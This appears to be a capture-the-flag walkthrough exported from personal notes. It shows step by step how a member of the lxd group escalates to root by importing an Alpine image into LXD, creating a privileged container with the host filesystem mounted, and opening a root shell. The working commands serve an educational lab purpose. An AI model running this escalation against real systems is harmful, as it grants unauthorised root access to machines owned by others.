<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux Containers</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux Containers</h1><br/><br /><a href="https://linuxcontainers.org/lxd/introduction/">https://linuxcontainers.org/lxd/introduction/</a><br /><br />LXD is a management API for dealing with LXC containers on Linux systems. It will<br />perform tasks for any members of the local lxd group. It does not make an effort to<br />match the permissions of the calling user to the function it is asked to perform.<br /><br />Digging a little deeper into LXD and searching for the keywords LXD Exploit on Google reveals the<br />following information.<br /><br /><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a><br /><br /><br />A member of the local “lxd” group can instantly escalate the privileges to root on the<br />host operating system. This is irrespective of whether that user has been granted sudo<br />rights and does not require them to enter their password. The vulnerability exists even<br />with the LXD snap package.<br /><br /><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a><br /><br /><br />This is exactly what we need and this HackTricks page describes the whole exploitation process step by step.<br />The exploit works by making use of the Alpine image, which is a lightweight Linux distribution based on busy<br />box. After this distribution is downloaded and built locally, an HTTP server is used to upload it to the remote<br />system. The image is then imported into LXD and it is used to mount the Host file system with root<br />privileges.<br /><br />Let&#39;s begin by installing the Go programming language as well as some other required packages.<br /><br />sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools<br /><br />Then we must clone the LXC Distribution Builder and build it.<br /><br />git clone <a href="https://github.com/lxc/distrobuilder">https://github.com/lxc/distrobuilder</a><br />cd distrobuilder<br />make<br /><br />After the build is complete let&#39;s download the Alpine YAML file and build it.<br /><br />mkdir -p $HOME/ContainerImages/alpine/<br />cd $HOME/ContainerImages/alpine/<br />wget <a href="https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml">https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml</a><br />sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8<br /><br />Once the build is done lxd.tar.xz and rootlet.squashfs will be available in the same folder.<br /><br /><a href=""><img src="images/44-1.png" alt="images/44-1.png" /></a><br /><br />We will now have to transfer these files to the target system through the usage of a Python HTTP server.<br />Run the following command locally on the same folder.<br /><br />python3 -m http.server 8000<br /><br />Then switch back to the reverse shell on the target system and download the files.<br /><br />wget http://{local_IP}:8000/lxd.tar.xz<br />wget <a href="http://{local_IP}:8000/rootfs.squashfs">http://{local_IP}:8000/rootfs.squashfs</a><br /><br />Note: As shown previously the local IP can be acquired through the ifconfig command line utility.<br />Once the transfer finishes, use the ls command to confirm the files transferred successfully.<br /><br /><a href=""><img src="images/44-2.png" alt="images/44-2.png" /></a><br /><br />The next step is to import the image using the LXC command-line tool.<br /><br />lxc image import lxd.tar.xz rootfs.squashfs --alias alpine<br /><br />To verify that the image has been successfully imported we can list the LXD images.<br /><br />lxc image list<br /><br /><a href=""><img src="images/44-3.png" alt="images/44-3.png" /></a><br /><br /><br />Alpine is correctly shown in the image list. We must now set the security.privileged flag to true, so that<br />the container has all of the privileges that the root file system has. We will also mount the root file system<br />on the container in the /mnt folder.<br /><br />lxc init alpine privesc -c security.privileged=true<br />lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true<br /><br /><a href=""><img src="images/44-4.png" alt="images/44-4.png" /></a><br /><br />inally we can start the container and start a root shell inside it.<br /><br />lxc start privesc<br />lxc exec privesc /bin/sh<br /><br /><a href=""><img src="images/44-5.png" alt="images/44-5.png" /></a><br /><br />To access the root flag, we can navigate to the /mnt/root/root folder.</div>
</body>
</html>
